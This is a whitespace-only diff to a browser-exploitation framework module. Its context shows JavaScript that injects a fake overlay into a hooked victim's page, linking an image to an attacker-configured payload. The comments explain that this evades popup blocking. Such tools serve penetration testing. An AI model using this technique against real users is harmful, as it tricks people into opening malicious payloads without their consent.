@@ -5,7 +5,7 @@
 //
 
 beef.execute(function() {
-  
+
 	// Module Configurations
   	var image				= "<%== @image %>";
     var payload_type		= "<%== @payload %>";
@@ -33,7 +33,7 @@ beef.execute(function() {
 	fakediv.setAttribute('style', 'position:absolute; top:20%; left:30%; z-index:51;');
 	fakediv.setAttribute('align', 'center');
 	document.body.appendChild(fakediv);
-	
+
 	// window.open is very useful when using data URI vectors and the IFrame/Object tag
 	// also, as the user is clicking on the link, the new tab opener is not blocked by the browser.
     fakediv.innerHTML = "<a href=\"" + payload + "\" target=\"_blank\" ><img src=\"" + image + "\" /></a>";
